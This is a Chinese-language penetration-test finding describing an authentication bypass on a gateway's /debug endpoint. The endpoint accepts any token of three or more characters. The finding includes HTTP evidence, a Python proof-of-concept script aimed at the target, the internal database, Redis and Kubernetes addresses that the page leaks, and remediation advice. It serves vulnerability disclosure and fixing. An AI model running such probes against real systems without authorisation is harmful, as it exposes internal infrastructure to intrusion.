# /debug 调试接口认证绕过（任意长度≥3的 token 均可访问）

**ID:** vuln-0004
**Severity:** MEDIUM
**Found:** 2026-10-31 04:11:52 UTC
**Target:** http://10.0.93.73:18080/
**Endpoint:** /debug
**Method:** GET
**CWE:** CWE-287
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Low

## Description

Nexus 网关的 `/debug` 调试控制台声称"仅限值班工程师访问"，未携带令牌时返回 401；但其遗留的 `token` 查询参数只校验字符串长度（≥3 个字符），不校验具体取值。攻击者无需任何有效凭据，使用 `token=abc` 之类的任意占位值即可获得 200 并读取内部调试信息。

## Evidence

无令牌时被拒绝：

```http
GET /debug HTTP/1.1
Host: 10.0.93.73:18080

HTTP/1.1 401 OK
Content-Type: text/html
Content-Length: 309

<h1>401 Unauthorized</h1>
<p>Debug console restricted to on-call engineers.</p>
<p>Legacy deploy hooks pass the rotation token as query param: <code>GET /debug?token=&lt;deploy-token&gt;</code></p>
```

`token=ab`（2 字符）仍被拒绝：

```http
GET /debug?token=ab HTTP/1.1

HTTP/1.1 401 OK
Content-Length: 708
```

`token=abc`（任意 3 字符）通过并泄露内部信息：

```http
GET /debug?token=abc HTTP/1.1
Host: 10.0.93.73:18080

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 810
Server: nexus-gateway/2.4.1

<h1>🔧 Debug Info (INTERNAL ONLY)</h1>
<pre>
Server: Ubuntu 22.04 LTS / nginx/1.24.0
App: Nexus-DevOps v3.2.1 (Spring Boot 2.7.18)
Gateway: nexus-gateway/2.4.1 (mgmt: /api/status, files: /api/files?path=)
Actuator: /actuator/env (internal monitoring)
DB Host: 10.99.50.52:5432
Redis: 10.99.50.68:6379 (master)
K8s: https://k8s-a684.prod.local:6443
Pod: nexus-api-84098669-x2k0p / Node: worker-72
...
Environment: production
Debug Mode: True (DO NOT ENABLE IN PROD)
</pre>
```

其他任意占位值（`anything`、`null`、`0000`、`!!!!`）同样返回 200，证明校验只看长度、不比对取值。

## Impact

未认证攻击者可读取仅限内部使用的调试信息，包括：服务器与中间件版本（Ubuntu 22.04 / nginx 1.24.0 / Spring Boot 2.7.18 / nexus-gateway 2.4.1）、内部数据库 `10.99.50.52:5432`、Redis `10.99.50.68:6379`、Kubernetes API `k8s-a684.prod.local:6443`、Pod/节点名称、生产环境标识以及近期错误日志。这些信息可直接用于规划对内网数据库、缓存与 K8s 控制面的后续攻击，并确认了 `/api/files` 符号链接检查被绕过的弱点。

## Counterevidence

已排除"需要特定有效令牌"的可能：分别测试了空值、1/2 字符、3/4/5/6/7 字符、`null`/`false`/`true`/`0000`/`!!!!`/`anything` 等，结果完全由长度决定（≥3 即 200），不存在取值白名单或签名校验。也测试了 `/Debug`、`/debug/`、`//debug`、`/debug;` 等路径变体，未发现额外入口，说明是同一路由的认证逻辑缺陷而非路由歧义。未观察到 WAF、速率限制或二次校验介入。限制：调试页仅泄露信息，未提供命令执行或配置修改功能，因此不夸大完整性/可用性影响。

## Confidence Rationale

认证绕过已在真实目标上以多组对照请求复现（401 vs 200），响应内容稳定且与取值无关。

## What Would Change This Severity

若该调试控制台进一步提供命令执行、配置读写或可下载凭据/密钥的能力，则应提升至高危或严重。

## Technical Analysis

`GET /debug` 在无 `token` 参数或 `token` 长度不足 3 时返回 401，提示"Debug console restricted to on-call engineers"，并说明遗留部署钩子通过查询参数传递轮换令牌：

```
GET /debug?token=<deploy-token>
```

实测该参数并未与任何服务端密钥比较，而是仅做长度判断：

- `GET /debug` → 401
- `GET /debug?token=` → 401
- `GET /debug?token=a` → 401
- `GET /debug?token=ab` → 401
- `GET /debug?token=abc` → 200（调试信息）
- `GET /debug?token=anything` → 200
- `GET /debug?token=null` / `false` / `0000` / `!!!!` → 200

即校验条件等价于 `len(token) >= 3`，任何占位字符串都能通过。该端点未采用签名、固定值比对或会话校验，属于典型的认证实现缺陷（"检查参数存在/形状"而非"校验凭据"）。路径大小写与结尾斜杠变体（`/Debug`、`/debug/`）返回 404，说明只有该精确路由暴露，但认证本身形同虚设。

## Proof of Concept

1. 直接请求 `/debug`，确认返回 401，说明端点本应受保护。
2. 请求 `/debug?token=ab`，仍返回 401，确认存在长度门槛。
3. 请求 `/debug?token=abc`，返回 200 并输出内部调试信息。
4. 将 `abc` 替换为任意 ≥3 字符的字符串（如 `anything`、`null`、`0000`），均返回 200，证明未对令牌取值做任何校验。

具体命令见 PoC 脚本。

```python
import requests

BASE = "http://10.0.93.73:18080"

# 1) 基线：无令牌 -> 401
r0 = requests.get(f"{BASE}/debug", timeout=10)
print("no token      :", r0.status_code)          # 401

# 2) 短令牌 -> 401（长度门槛）
r1 = requests.get(f"{BASE}/debug", params={"token": "ab"}, timeout=10)
print("token=ab      :", r1.status_code)          # 401

# 3) 任意 >=3 字符令牌 -> 200，返回内部调试信息
r2 = requests.get(f"{BASE}/debug", params={"token": "abc"}, timeout=10)
print("token=abc     :", r2.status_code)          # 200
print(r2.text)

# 4) 与令牌取值无关
for tok in ["anything", "null", "0000", "!!!!"]:
    r = requests.get(f"{BASE}/debug", params={"token": tok}, timeout=10)
    print(f"token={tok:9}:", r.status_code)        # 全部 200
```

## Remediation

1. 移除 `/debug` 的路由级"令牌"开关，改为强制认证：接入统一身份认证与角色校验（如仅允许 on-call 工程师角色），并在服务端校验会话签名。
2. 若必须保留遗留部署钩子，应将令牌与服务器端存储的随机高熵密钥做恒定时间比较，令牌不得通过 URL 查询参数传递（避免日志/Referer 泄露），改用 `Authorization` 头并支持轮换与吊销。
3. 生产环境应关闭调试模式与详细错误输出，调试端点默认不对外暴露（仅内网/管理网可达）。
4. 在网关层对 `/debug` 增加访问控制与审计日志，失败尝试告警。

## Assumptions

攻击者可直接访问 `10.0.93.73:18080`（本次测试即为未认证直连）；端点位于生产环境标识下，调试输出携带真实内部主机名与组件版本。
